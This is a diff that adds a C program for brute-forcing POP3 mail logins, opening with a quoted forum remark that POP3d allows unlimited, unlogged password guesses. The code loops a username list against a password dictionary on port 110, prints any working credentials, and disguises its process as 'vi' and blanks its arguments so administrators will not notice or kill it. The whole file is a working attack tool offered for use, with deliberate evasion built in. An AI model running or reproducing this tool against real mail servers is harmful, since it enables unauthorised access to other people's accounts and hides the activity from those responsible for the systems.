@@ -1,0 +1,257 @@
+/* : After recently installing POP3d on a machine, I played around with it a 
+: bit and came to a few conclusions:
+: 	1) It allows for multiple username/password guesses
+: 	2) There is no logging option for basd user/pass guesses.
+
+: This seems like something just begging to be brute force hacked.
+: Any comments?        */
+
+#include <stdio.h>
+#include <string.h>
+#include <signal.h>
+#include <unistd.h>
+#include <sys/param.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <stdarg.h> 
+
+/* First, define the POP-3 port - almost always 110 */
+#define POP3_PORT               110
+
+/* What we want our program to be masked as, so nosy sysadmins dont kill us */
+#define MASKAS                  "vi"
+
+/* Repeat connect or not - remember, logs still report a connection, so
+you might want to set this to 0. If set to 0, it will hack until it finds
+1 user/password then exit. If set to 1, it will reconnect and try more
+user/passwords (until it runs out of usernames) */
+#define RECONNECT		0
+
+
+
+/* The function prototypes */
+void nuke_string(char *);
+int pop_connect(char *);
+int pop_guess(char *, char *);
+char *getanswer(char *);
+char *getanswer_(char *);
+void swallow_welcome(void);
+void hackity_hack(void);
+
+int popfd;
+FILE *popfp;
+
+FILE *userfile;
+FILE *dictfile;
+
+char host[255];
+char dict[255];
+char user[255];
+
+main(int argc, char **argv)
+{
+   if(argc < 4)
+   {
+      /* invalid syntax, display syntax and exit */   
+      printf("Syntax: %s host userfile dictfile\n", argv[0]);
+      exit(0);
+   }   
+   
+   /* Validate that the host exists */
+   if(pop_connect(argv[1]) == -1)
+   {
+      /* Error */
+      printf("Error connecting to host %s\n", argv[1]);
+      exit(0);
+   }
+   printf("Connected to: %s\n\n", argv[1]);
+   
+   /* Check for the existance of the user file */
+   userfile=fopen(argv[2], "rt");
+   if(userfile==NULL)
+   {
+      /* Error */
+      printf("Error opening userfile %s\n", argv[2]);
+      exit(0);
+   }
+   fclose(userfile);
+   
+   /* Checking for the existance of dict file */
+   dictfile=fopen(argv[3], "rt");
+   if(dictfile==NULL)
+   {
+      /* Error */
+      printf("Error opening dictfile %s\n", argv[3]);
+      exit(0);
+   }
+   fclose(dictfile);
+   
+   /* Copy important arguments to variables */
+   strcpy(host, argv[1]);
+   strcpy(user, argv[2]);
+   strcpy(dict, argv[3]);
+               
+   nuke_string(argv[0]);
+   nuke_string(argv[1]);
+   nuke_string(argv[2]);
+   nuke_string(argv[3]);   
+ strcpy(argv[0], MASKAS);
+
+   swallow_welcome();   
+   hackity_hack();
+}
+
+      
+void nuke_string(char *targetstring)
+{
+   char *mystring=targetstring;
+   
+   while(*targetstring != '\0')
+   {
+      *targetstring=' ';
+      targetstring++;
+   }
+   *mystring='\0';
+}
+
+
+int pop_connect(char *pophost)
+{
+   int popsocket;
+   struct sockaddr_in sin;
+   struct hostent *hp;
+      
+   hp=gethostbyname(pophost);
+   if(hp==NULL) return -1;
+   
+   bzero((char *)&sin,sizeof(sin));
+   bcopy(hp->h_addr,(char *)&sin.sin_addr,hp->h_length);
+   sin.sin_family=hp->h_addrtype;
+   sin.sin_port=htons(POP3_PORT);
+   popsocket=socket(AF_INET, SOCK_STREAM, 0);
+   if(popsocket==-1) return -1;
+   if(connect(popsocket,(struct sockaddr *)&sin,sizeof(sin))==-1) return -1;
+   popfd=popsocket;
+   return popsocket;   
+}
+int pop_guess(char *username, char *password)
+{
+   char buff[512];
+   
+   sprintf(buff, "USER %s\n", username);
+   send(popfd, buff, strlen(buff), 0);   
+   getanswer(buff);
+      
+   sprintf(buff, "PASS %s\n", password);
+   send(popfd, buff, strlen(buff), 0);
+   getanswer(buff);
+   if(strstr(buff, "+OK") != NULL)
+   {
+      printf("USERNAME: %s\nPASSWORD: %s\n\n", username, password);
+      return 0;
+   }
+   else return -1;
+}
+
+char *getanswer(char *buff)
+{
+   for(;;)
+   {
+      getanswer_(buff);
+      if(strstr(buff, "+OK") != NULL) return buff;
+      if(strstr(buff, "-ERR") != NULL) return buff;
+   }
+}
+
+char *getanswer_(char *buff)
+{
+   int ch;
+   char *in=buff;
+   
+   for(;;)
+   {
+      ch=getc(popfp);
+      if(ch == '\r');
+      if(ch == '\n')
+      {
+         *in='\0';
+         return buff;
+      }
+      else
+      {
+         *in=(char)ch;
+         in++;
+      }
+   }
+}
+void swallow_welcome(void)
+{
+   char b[100];  
+   popfp=fdopen(popfd, "rt");      
+   getanswer(b);
+}
+
+
+void hackity_hack(void)
+{
+   char *un;
+   char *pw;
+   char *c;
+   int found=0;
+   
+   un=(char *)malloc(512);
+   pw=(char *)malloc(512);
+   if(un==NULL || pw==NULL) return;
+   
+   userfile=fopen(user, "rt");
+   dictfile=fopen(dict, "rt");
+   if(userfile == NULL || dictfile == NULL) return;
+   
+   for(;;)
+   {
+      while(fgets(un, 50, userfile) != NULL)
+      {
+         found=0;
+         c=strchr(un, 10);
+         if(c != NULL) *c=0;
+         
+         c=strchr(un, 13);
+         if(c != NULL) *c=0;
+         
+         while(fgets(pw, 50, dictfile) != NULL && found==0)
+         {
+            c=strchr(pw, 10);
+            if(c != NULL) *c=0;
+            
+            c=strchr(pw, 13);
+            if(c != NULL) *c=0;
+            
+            if(strlen(pw) > 2 && strlen(un) > 2)
+               if(pop_guess(un, pw)==0)
+               {
+                  found=1;
+                  fclose(popfp);
+                  close(popfd);
+                  if(RECONNECT==0)
+      {
+                     free(pw);
+                     free(un);
+                     fclose(userfile);
+                     fclose(dictfile);
+                     exit(0);
+                  }
+                  pop_connect(host);
+                  swallow_welcome();               
+               }                           
+         }
+         fclose(dictfile);
+         dictfile=fopen(dict, "rt");
+      }
+      fclose(dictfile);
+      fclose(userfile);
+      free(un);
+      free(pw);
+      exit(0);
+   }
+}
